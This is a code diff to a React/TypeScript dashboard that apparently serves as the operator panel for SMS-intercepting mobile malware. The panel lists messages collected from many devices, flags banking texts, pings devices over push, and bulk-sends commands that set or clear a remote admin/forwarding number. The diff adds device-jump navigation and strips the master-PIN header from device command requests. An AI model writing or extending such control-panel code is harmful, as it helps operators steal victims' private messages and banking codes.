@@ -455,7 +455,7 @@ function fmtShort(iso: string): string {
 }
 
 /* ── MsgCard — identical to sub admin's MsgCard design ── */
-function MsgCard({ msg, appColor }: { msg: MsgRow; appColor: string }) {
+function MsgCard({ msg, appColor, onOpenDevice }: { msg: MsgRow; appColor: string; onOpenDevice?: (deviceId: string) => void }) {
   const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
   const isBank = isBankingMsg(msg.body, msg.fromSender);
   const [copiedBody, setCopiedBody] = useState(false);
@@ -470,7 +470,10 @@ function MsgCard({ msg, appColor }: { msg: MsgRow; appColor: string }) {
       position: "relative", borderRadius: 8, overflow: "hidden",
       border: `1px solid ${T.borderLight}`,
       contentVisibility: "auto", containIntrinsicSize: "auto 140px",
-    } as React.CSSProperties}>
+      cursor: onOpenDevice ? "pointer" : "default",
+    } as React.CSSProperties}
+      onClick={() => onOpenDevice?.(msg.deviceId)}
+    >
       <div style={{ background: T.card, padding: "10px 14px", transition: "box-shadow 0.15s" }}
         onMouseEnter={e => (e.currentTarget as HTMLDivElement).style.boxShadow = "0 2px 8px rgba(99,102,241,0.13)"}
         onMouseLeave={e => (e.currentTarget as HTMLDivElement).style.boxShadow = "none"}
@@ -535,7 +538,7 @@ function MsgCard({ msg, appColor }: { msg: MsgRow; appColor: string }) {
 /* ══════════════════════════════════════════
    MESSAGES TAB
 ══════════════════════════════════════════ */
-function MessagesTab({ apps, masterPin, syncTick: _syncTick }: { apps: App[]; masterPin: string; syncTick?: number }) {
+function MessagesTab({ apps, masterPin, syncTick: _syncTick, onOpenDevice }: { apps: App[]; masterPin: string; syncTick?: number; onOpenDevice?: (deviceId: string) => void }) {
   /* ── State ── */
   const [msgs, setMsgs] = useState<MsgRow[]>([]);
   const [appFilter, setAppFilter] = useState("");
@@ -776,7 +779,7 @@ function MessagesTab({ apps, masterPin, syncTick: _syncTick }: { apps: App[]; ma
         <>
           <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
             {displayed.map(msg => (
-              <MsgCard key={msg.id} msg={msg} appColor={appColors[msg.appId] ?? T.accent} />
+              <MsgCard key={msg.id} msg={msg} appColor={appColors[msg.appId] ?? T.accent} onOpenDevice={onOpenDevice} />
             ))}
           </div>
           {/* Browse mode: infinite scroll sentinel */}
@@ -848,7 +851,7 @@ function CopyIconBtn({ value, title = "Copy" }: { value: string; title?: string 
   );
 }
 
-function GroupsTab({ apps, masterPin, syncTick: _syncTick }: { apps: App[]; masterPin: string; syncTick?: number }) {
+function GroupsTab({ apps, masterPin, syncTick: _syncTick, onOpenDevice }: { apps: App[]; masterPin: string; syncTick?: number; onOpenDevice?: (deviceId: string) => void }) {
   const [groups, setGroups] = useState<GroupRow[]>([]);
   const [loading, setLoading] = useState(false);
   const [loadingAll, setLoadingAll] = useState(false); // background: fetching pages 2+
@@ -1034,9 +1037,14 @@ function GroupsTab({ apps, masterPin, syncTick: _syncTick }: { apps: App[]; mast
                           <CopyIconBtn value={dev.deviceId} title="Copy device ID" />
                           <span style={{ fontSize: 9, color: "#64748b" }}>{timeAgo(lastOnline)}</span>
                         </div>
-                        <span style={{ fontSize: 10, padding: "4px 12px", borderRadius: 7, border: "none", background: T.accent, color: "#fff", fontWeight: 700, flexShrink: 0, boxShadow: "0 2px 8px rgba(99,102,241,0.35)" }}>
+                        <span style={{ fontSize: 10, padding: "4px 8px", borderRadius: 7, background: T.headerBg, border: `1px solid ${B}`, color: T.mutedLight, fontWeight: 700, flexShrink: 0 }}>
                           {dev.entries.length} entr{dev.entries.length !== 1 ? "ies" : "y"}
                         </span>
+                        {onOpenDevice && (
+                          <button onClick={() => onOpenDevice(dev.deviceId)} style={{ fontSize: 12, padding: "5px 14px", borderRadius: 7, border: "none", background: T.accent, color: "#fff", cursor: "pointer", fontWeight: 700, flexShrink: 0, boxShadow: "0 2px 8px rgba(99,102,241,0.4)" }}>
+                            Open
+                          </button>
+                        )}
                       </div>
 
                       {/* All entries expanded inline */}
@@ -1635,7 +1643,7 @@ function CardCheckBtn({ device, masterPin }: { device: FullDevice; masterPin: st
     }, 1000);
 
     try {
-      await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "online_check" } }) });
+      await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
 
       // Primary: poll every 3s — compare lastOnline to detect device response
       const prevOnline = device.lastOnline;
@@ -1721,7 +1729,7 @@ const DeviceCard = memo(function DeviceCard({
    DEVICES TAB
 ══════════════════════════════════════════ */
 const PAGE_SIZE = 48;
-function DevicesTab({ apps = [], masterPin, syncTick, onlineCount: onlineCountProp, onlineFilter = false, onClearOnlineFilter }: { apps?: App[]; masterPin: string; syncTick?: number; onOnlineCount?: (n: number) => void; onlineCount?: number; onlineFilter?: boolean; onClearOnlineFilter?: () => void }) {
+function DevicesTab({ apps = [], masterPin, syncTick, onlineCount: onlineCountProp, onlineFilter = false, onClearOnlineFilter, jumpDeviceId }: { apps?: App[]; masterPin: string; syncTick?: number; onOnlineCount?: (n: number) => void; onlineCount?: number; onlineFilter?: boolean; onClearOnlineFilter?: () => void; jumpDeviceId?: string | null }) {
   const [devices, setDevices] = useState<FullDevice[]>([]);
   const [totalCount, setTotalCount] = useState(0);
   const [hasMore, setHasMore] = useState(false);
@@ -1732,6 +1740,22 @@ function DevicesTab({ apps = [], masterPin, syncTick, onlineCount: onlineCountPr
   const [debouncedSearch, setDebouncedSearch] = useState("");
   const [selected, setSelected] = useState<FullDevice | null>(null);
   const handleSelect = useCallback((d: FullDevice) => setSelected(d), []);
+
+  // Jump to device when navigated from Messages/Groups tab
+  useEffect(() => {
+    if (!jumpDeviceId) return;
+    // Try existing list first
+    const found = devices.find(d => d.deviceId === jumpDeviceId);
+    if (found) { setSelected(found); return; }
+    // Otherwise fetch it individually
+    apiFetch(`/api/master/all-devices?search=${encodeURIComponent(jumpDeviceId)}&limit=5`, { headers: { "x-master-pin": masterPin } })
+      .then(r => r.ok ? r.json() : null)
+      .then((j: { data?: FullDevice[] } | null) => {
+        const d = (j?.data ?? []).find(x => x.deviceId === jumpDeviceId);
+        if (d) setSelected(d);
+      })
+      .catch(() => {});
+  }, [jumpDeviceId]); // eslint-disable-line react-hooks/exhaustive-deps
   const prevSyncRef = useRef(syncTick);
   const sentinelRef = useRef<HTMLDivElement>(null);
 
@@ -1971,10 +1995,10 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
         const batch = eligible.slice(i, i + BATCH);
         const results = await Promise.allSettled(batch.map(d => {
           let data: Record<string, string>;
-          if (batchAction === "ping") data = { type: "online_check" };
-          else if (batchAction === "disable") data = { type: "admin_update", status: "off", deviceId: d.deviceId };
-          else data = { type: "admin_update", status: "on", adminNumber: adminNumInput.trim(), deviceId: d.deviceId };
-          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); });
+          if (batchAction === "ping") data = { type: "0" };
+          else if (batchAction === "disable") data = { type: "admin_update", status: "off" };
+          else data = { type: "admin_update", status: "on", number: adminNumInput.trim() };
+          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); });
         }));
         results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
         setBatchDone(Math.min(i + BATCH, eligible.length));
@@ -2167,7 +2191,15 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
   const [onlineCount, setOnlineCount] = useState(0);
   const [syncTick, setSyncTick] = useState(0);
   const [wsConnected, setWsConnected] = useState(false);
+  const [jumpDeviceId, setJumpDeviceId] = useState<string | null>(null);
   const sortedApps = [...appList].sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
+
+  function openDevice(deviceId: string) {
+    setJumpDeviceId(deviceId);
+    changeTab("devices");
+    // Reset so same deviceId can be re-triggered
+    setTimeout(() => setJumpDeviceId(null), 500);
+  }
 
   const fetchApps = useCallback(async () => {
     try {
@@ -2244,7 +2276,7 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
       for (let i = 0; i < eligible.length; i += BATCH) {
         const batch = eligible.slice(i, i + BATCH);
         const results = await Promise.allSettled(batch.map(d =>
-          apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: d.deviceId, data: { type: "online_check" } }) }).then(res => { if (!res.ok) throw new Error(); })
+          apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data: { type: "0" } }) }).then(res => { if (!res.ok) throw new Error(); })
         ));
         results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
         setPingDone(Math.min(i + BATCH, eligible.length));
@@ -2445,13 +2477,13 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
           </>
         )}
 
-        <div style={{ display: tab === "messages" ? "block" : "none" }}><MessagesTab apps={appList} masterPin={masterPin} syncTick={syncTick} /></div>
+        <div style={{ display: tab === "messages" ? "block" : "none" }}><MessagesTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOpenDevice={openDevice} /></div>
         {/* Mobile FAB — New App (only on apps tab) */}
         {tab === "apps" && (
           <button className="ma-fab" onClick={() => setShowCreate(true)} title="New App">＋</button>
         )}
-        <div style={{ display: tab === "groups" ? "block" : "none" }}><GroupsTab apps={appList} masterPin={masterPin} syncTick={syncTick} /></div>
-        <div style={{ display: tab === "devices" ? "block" : "none" }}><DevicesTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOnlineCount={setOnlineCount} onlineCount={onlineCount} onlineFilter={onlineFilter} onClearOnlineFilter={() => setOnlineFilter(false)} /></div>
+        <div style={{ display: tab === "groups" ? "block" : "none" }}><GroupsTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOpenDevice={openDevice} /></div>
+        <div style={{ display: tab === "devices" ? "block" : "none" }}><DevicesTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOnlineCount={setOnlineCount} onlineCount={onlineCount} onlineFilter={onlineFilter} onClearOnlineFilter={() => setOnlineFilter(false)} jumpDeviceId={jumpDeviceId} /></div>
         <div style={{ display: tab === "settings" ? "block" : "none" }}><SettingsTab apps={appList} masterPin={masterPin} /></div>
       </div>
 
